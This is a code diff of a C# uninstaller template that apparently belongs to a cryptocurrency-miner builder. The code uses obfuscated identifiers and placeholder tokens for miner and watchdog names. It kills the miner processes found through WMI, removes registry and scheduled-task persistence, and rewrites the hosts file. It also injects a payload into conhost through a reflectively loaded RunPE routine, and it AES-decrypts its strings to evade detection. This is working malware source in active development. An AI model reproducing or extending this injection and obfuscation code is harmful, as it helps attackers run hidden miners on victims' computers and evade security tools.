@@ -18,8 +18,8 @@ using System.Windows.Forms;
 
 public partial class _rUninstaller_
 {
-    public static string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), _rGetString_("#LIBSPATH"));
-    public static string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), _rGetString_("#WATCHDOGPATH"));
+    public static string _rbD_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#LIBSPATH");
+    public static string _rbD2_ = Path.Combine(Environment.GetFolderPath($LIBSROOT), "#WATCHDOGPATH");
 
 
     public static void Main()
@@ -38,7 +38,7 @@ public partial class _rUninstaller_
                             using (var _rms_ = new MemoryStream())
                             {
                                 _rstreamdata_.CopyTo(_rms_);
-                                _rRun_(_rms_.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, _rGetString_("#CONHOST")), null);
+                                _rRun_(_rms_.ToArray(), Path.Combine(Directory.GetParent(Environment.SystemDirectory).FullName, "#CONHOST"), null);
                             }
                         }
                     }
@@ -55,7 +55,7 @@ public partial class _rUninstaller_
 #if DefInstall
         try
         {
-            foreach (Process proc in Process.GetProcessesByName(_rGetString_("#WATCHDOGNAME")))
+            foreach (Process proc in Process.GetProcessesByName("#WATCHDOGNAME"))
             {
                 proc.Kill();
             }
@@ -69,14 +69,14 @@ public partial class _rUninstaller_
 
         try
         {
-            _rCommand_(_rGetString_("#SCMD"), _rGetString_("#REGREM"));
+            _rCommand_("#SCMD", "#REGREM");
 
         }
         catch {}
 
         try
         {
-            _rCommand_(_rGetString_("#SCMD"), _rGetString_("#TASKSCHREM"));
+            _rCommand_("#SCMD", "#TASKSCHREM");
         }
         catch (Exception ex)
         {
@@ -91,15 +91,15 @@ public partial class _rUninstaller_
         {
             var _rarg1_ = new ConnectionOptions();
             _rarg1_.Impersonation = ImpersonationLevel.Impersonate;
-            var _rarg2_ = new ManagementScope(_rGetString_("#WMISCOPE"), _rarg1_);
+            var _rarg2_ = new ManagementScope("#WMISCOPE", _rarg1_);
             _rarg2_.Connect();
 
             var _rarg3_ = new ManagementObjectSearcher(_rarg2_, new ObjectQuery("Select CommandLine, ProcessID from Win32_Process")).Get();
             foreach (ManagementObject MemObj in _rarg3_)
             {
-                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains(_rGetString_("#MINERID")) || MemObj["CommandLine"].ToString().Contains(_rGetString_("#WATCHDOGID"))))
+                if (MemObj != null && MemObj["CommandLine"] != null && (MemObj["CommandLine"].ToString().Contains("#MINERID") || MemObj["CommandLine"].ToString().Contains("#WATCHDOGID")))
                 {
-                    _rCommand_(_rGetString_("#SCMD"), string.Format(_rGetString_("#CMDKILL"), MemObj["ProcessID"]));
+                    _rCommand_("#SCMD", string.Format("#CMDKILL", MemObj["ProcessID"]));
                 }
             }
         }
@@ -124,7 +124,7 @@ public partial class _rUninstaller_
 #if DefBlockWebsites
         try
         {
-            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), _rGetString_("#HOSTSPATH"));
+            string _rhostspath_ = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "#HOSTSPATH");
             List<string> _rhostscontent_ = new List<string>(File.ReadAllLines(_rhostspath_));
 
             string[] _rdomainset_ = new string[] { DOMAINSET };
@@ -153,24 +153,23 @@ public partial class _rUninstaller_
 
     public static string _rGetString_(string _rarg1_)
     {
-        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
+        return Encoding.Unicode.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 
-    public static byte[] _rAESMethod_(byte[] _rarg1_, bool _rarg2_ = false)
+    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
-        var _rarg3_ = Encoding.ASCII.GetBytes("#IV");
-        var _rarg4_ = new Rfc2898DeriveBytes("#KEY", Encoding.ASCII.GetBytes("#SALT"), 100);
-        var _rarg5_ = new RijndaelManaged() { KeySize = 256, Mode = CipherMode.CBC };
-        var _rarg6_ = _rarg2_ ? _rarg5_.CreateEncryptor(_rarg4_.GetBytes(16), _rarg3_) : _rarg5_.CreateDecryptor(_rarg4_.GetBytes(16), _rarg3_);
-        using (var _rarg7_ = new MemoryStream())
+        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
+        using (Aes _raesAlg_ = Aes.Create())
         {
-            using (var _rarg8_ = new CryptoStream(_rarg7_, _rarg6_, CryptoStreamMode.Write))
+            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
             {
-                _rarg8_.Write(_rarg1_, 0, _rarg1_.Length);
-                _rarg8_.Close();
+                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
+                {
+                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
+                    _rcsDecrypt_.Close();
+                }
+                return _rmsDecrypt_.ToArray();
             }
-
-            return _rarg7_.ToArray();
         }
     }
 
@@ -204,7 +203,7 @@ public partial class _rUninstaller_
     
     public static void _rRun_(byte[] _rpayload_, string _rinjectionpath_, string _rarguments_)
     {
-        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType(_rGetString_("#RUNPETYPE")).GetMethod(_rGetString_("#RUNPEMETHOD"), BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
+        Assembly.Load(_rGetTheResource_("#RESRPE")).GetType("#RUNPETYPE").GetMethod("#RUNPEMETHOD", BindingFlags.Public | BindingFlags.Static).Invoke(null, new object[] { _rpayload_, _rinjectionpath_, _rarguments_ });
     }
 #endif
 }
